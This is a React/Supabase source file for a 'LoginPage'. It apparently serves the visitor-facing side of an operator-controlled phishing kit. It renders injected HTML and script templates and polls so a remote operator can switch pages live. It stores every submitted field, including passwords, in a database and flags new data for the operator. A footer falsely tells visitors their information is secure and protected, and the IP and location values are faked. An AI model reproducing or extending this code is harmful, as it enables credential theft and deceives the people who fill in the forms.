
import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Loader } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';

const LoginPage = () => {
  const { sessionId } = useParams<{ sessionId: string }>();
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [session, setSession] = useState<any>(null);
  const [subPage, setSubPage] = useState<any>(null);
  const [mainPage, setMainPage] = useState<any>(null);
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [pageLoading, setPageLoading] = useState(true);

  // Fetch session data directly from Supabase
  useEffect(() => {
    const fetchSession = async () => {
      if (!sessionId) {
        setError('Invalid session ID');
        setPageLoading(false);
        return;
      }

      try {
        console.log('Fetching session:', sessionId);
        
        // Get session data
        const { data: sessionData, error: sessionError } = await supabase
          .from('sessions')
          .select('*')
          .eq('id', sessionId)
          .eq('active', true)
          .single();

        if (sessionError || !sessionData) {
          console.error('Session error:', sessionError);
          setError('Session not found or inactive');
          setPageLoading(false);
          return;
        }

        console.log('Session data found:', sessionData);
        setSession(sessionData);

        // Get main page data
        const { data: mainPageData, error: mainPageError } = await supabase
          .from('main_pages')
          .select('*')
          .eq('id', sessionData.main_page_id)
          .single();

        if (mainPageError || !mainPageData) {
          console.error('Main page error:', mainPageError);
          setError('Page template not found');
          setPageLoading(false);
          return;
        }

        console.log('Main page data found:', mainPageData);
        setMainPage(mainPageData);

        // Get sub page data
        const { data: subPageData, error: subPageError } = await supabase
          .from('sub_pages')
          .select('*')
          .eq('id', sessionData.current_sub_page_id)
          .single();

        if (subPageError || !subPageData) {
          console.error('Sub page error:', subPageError);
          setError('Sub page template not found');
          setPageLoading(false);
          return;
        }

        console.log('Sub page data found:', subPageData);
        setSubPage(subPageData);
        setPageLoading(false);
      } catch (err) {
        console.error('Error fetching session:', err);
        setError('Failed to load session');
        setPageLoading(false);
      }
    };

    fetchSession();
  }, [sessionId]);

  // Poll for session updates every 3 seconds
  useEffect(() => {
    if (!sessionId || !session) return;

    const intervalId = setInterval(async () => {
      try {
        const { data: updatedSession, error } = await supabase
          .from('sessions')
          .select('*')
          .eq('id', sessionId)
          .eq('active', true)
          .single();

        if (!error && updatedSession && updatedSession.current_sub_page_id !== session.current_sub_page_id) {
          console.log('Session updated, fetching new sub page:', updatedSession.current_sub_page_id);
          setSession(updatedSession);
          
          // Fetch new sub page data
          const { data: newSubPageData, error: subPageError } = await supabase
            .from('sub_pages')
            .select('*')
            .eq('id', updatedSession.current_sub_page_id)
            .single();

          if (!subPageError && newSubPageData) {
            console.log('New sub page loaded:', newSubPageData);
            setSubPage(newSubPageData);
            setFormData({});
            setSubmitted(false);
            setIsLoading(false);
          }
        }
      } catch (err) {
        console.error('Error polling session:', err);
      }
    }, 3000);

    return () => clearInterval(intervalId);
  }, [sessionId, session]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!sessionId || !session) {
      setError('Session not available');
      return;
    }
    
    try {
      setIsLoading(true);
      
      const mockLocation = 'New York, USA';
      const mockIp = '192.168.1.' + Math.floor(Math.random() * 255);
      
      console.log('Submitting form data:', formData);
      
      const { error } = await supabase
        .from('session_data')
        .insert({
          session_id: sessionId,
          timestamp: new Date().toISOString(),
          ip_address: mockIp,
          location: mockLocation,
          form_data: formData
        });

      if (error) throw error;

      // Update session to mark new data
      await supabase
        .from('sessions')
        .update({ has_new_data: true })
        .eq('id', sessionId);
      
      setTimeout(() => {
        setIsLoading(false);
        setSubmitted(true);
      }, 1500);
      
      setFormData({});
    } catch (err) {
      setIsLoading(false);
      setError('Failed to submit data');
      console.error(err);
    }
  };

  // Custom form handler for injected HTML
  const handleCustomFormSubmit = (event: Event) => {
    event.preventDefault();
    const form = event.target as HTMLFormElement;
    const formDataObj: Record<string, string> = {};
    
    const formData = new FormData(form);
    for (const [key, value] of formData.entries()) {
      formDataObj[key] = value.toString();
    }
    
    console.log('Custom form data:', formDataObj);
    setFormData(formDataObj);
    handleSubmit(event as unknown as React.FormEvent);
  };

  // Inject form submission handler into custom HTML
  useEffect(() => {
    if (subPage?.html) {
      const forms = document.querySelectorAll('#custom-form form');
      forms.forEach(form => {
        form.addEventListener('submit', handleCustomFormSubmit);
      });
      
      return () => {
        forms.forEach(form => {
          form.removeEventListener('submit', handleCustomFormSubmit);
        });
      };
    }
  }, [subPage?.html]);

  if (pageLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md animate-pulse">
          <CardHeader>
            <div className="h-7 bg-muted rounded-md mb-2"></div>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="h-10 bg-muted rounded-md"></div>
            <div className="h-10 bg-muted rounded-md"></div>
            <div className="h-10 bg-muted rounded-md"></div>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center text-destructive">Error</CardTitle>
          </CardHeader>
          <CardContent>
            <Alert variant="destructive">
              <AlertTitle>Something went wrong</AlertTitle>
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center">Processing</CardTitle>
          </CardHeader>
          <CardContent className="flex flex-col items-center justify-center py-8">
            <Loader className="h-12 w-12 animate-spin text-primary mb-4" />
            <p className="text-center text-muted-foreground">
              Please wait while we process your submission...
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (submitted) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center text-green-600">Success!</CardTitle>
          </CardHeader>
          <CardContent>
            <Alert>
              <AlertTitle>Submission Received</AlertTitle>
              <AlertDescription>
                Your information has been successfully submitted. Thank you!
              </AlertDescription>
            </Alert>
          </CardContent>
          <CardFooter>
            <Button className="w-full" onClick={() => setSubmitted(false)}>
              Submit Another Response
            </Button>
          </CardFooter>
        </Card>
      </div>
    );
  }

  if (!session || !subPage) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle className="text-center">Session Not Available</CardTitle>
          </CardHeader>
          <CardContent>
            <Alert>
              <AlertTitle>Session Issue</AlertTitle>
              <AlertDescription>
                This session may have expired or been closed. Please contact the session creator for a new link.
              </AlertDescription>
            </Alert>
          </CardContent>
        </Card>
      </div>
    );
  }

  // If subpage has custom HTML, render it with CSS and JS
  if (subPage.html && subPage.html.trim()) {
    console.log('Rendering custom HTML for subpage:', subPage.name);
    
    // Inject CSS and JS if available
    useEffect(() => {
      // Inject CSS
      if (subPage.css) {
        const styleElement = document.createElement('style');
        styleElement.textContent = subPage.css;
        styleElement.id = 'custom-css';
        document.head.appendChild(styleElement);
        
        return () => {
          const existingStyle = document.getElementById('custom-css');
          if (existingStyle) {
            existingStyle.remove();
          }
        };
      }
    }, [subPage.css]);

    useEffect(() => {
      // Inject JS
      if (subPage.javascript) {
        const scriptElement = document.createElement('script');
        scriptElement.textContent = subPage.javascript;
        scriptElement.id = 'custom-js';
        document.body.appendChild(scriptElement);
        
        return () => {
          const existingScript = document.getElementById('custom-js');
          if (existingScript) {
            existingScript.remove();
          }
        };
      }
    }, [subPage.javascript]);

    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <div 
          id="custom-form"
          className="w-full max-w-4xl"
          dangerouslySetInnerHTML={{ __html: subPage.html }} 
        />
      </div>
    );
  }

  // Dynamic form based on current subpage fields
  const renderDynamicForm = () => {
    console.log('Rendering dynamic form for sub page:', subPage.name);
    console.log('Sub page fields:', subPage.fields);
    
    // Check if subpage has defined fields
    if (subPage.fields && subPage.fields.length > 0) {
      return (
        <div className="grid gap-4">
          {subPage.fields.map((field: string) => (
            <div key={field} className="space-y-2">
              <Label htmlFor={field}>{field.charAt(0).toUpperCase() + field.slice(1).replace('_', ' ')}</Label>
              <Input 
                id={field} 
                name={field}
                type={field.includes('password') ? 'password' : field.includes('email') ? 'email' : 'text'}
                required
                value={formData[field] || ''}
                onChange={handleInputChange}
              />
            </div>
          ))}
          <Button type="submit" className="w-full">Submit</Button>
        </div>
      );
    }

    // Default form
    return (
      <div className="grid gap-4">
        <div className="space-y-2">
          <Label htmlFor="email">Email</Label>
          <Input 
            id="email" 
            name="email" 
            type="email" 
            placeholder="name@example.com" 
            required
            value={formData.email || ''}
            onChange={handleInputChange}
          />
        </div>
        <div className="space-y-2">
          <Label htmlFor="message">Message</Label>
          <Input 
            id="message" 
            name="message" 
            type="text" 
            placeholder="Your message" 
            required
            value={formData.message || ''}
            onChange={handleInputChange}
          />
        </div>
        <Button type="submit" className="w-full">Submit</Button>
      </div>
    );
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader>
          <CardTitle className="text-center">{subPage.name}</CardTitle>
          {subPage.description && (
            <p className="text-center text-muted-foreground text-sm">{subPage.description}</p>
          )}
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit}>
            {renderDynamicForm()}
          </form>
        </CardContent>
        <CardFooter className="justify-center">
          <p className="text-sm text-muted-foreground">
            This is a secure form. Your information is protected.
          </p>
        </CardFooter>
      </Card>
    </div>
  );
};

export default LoginPage;
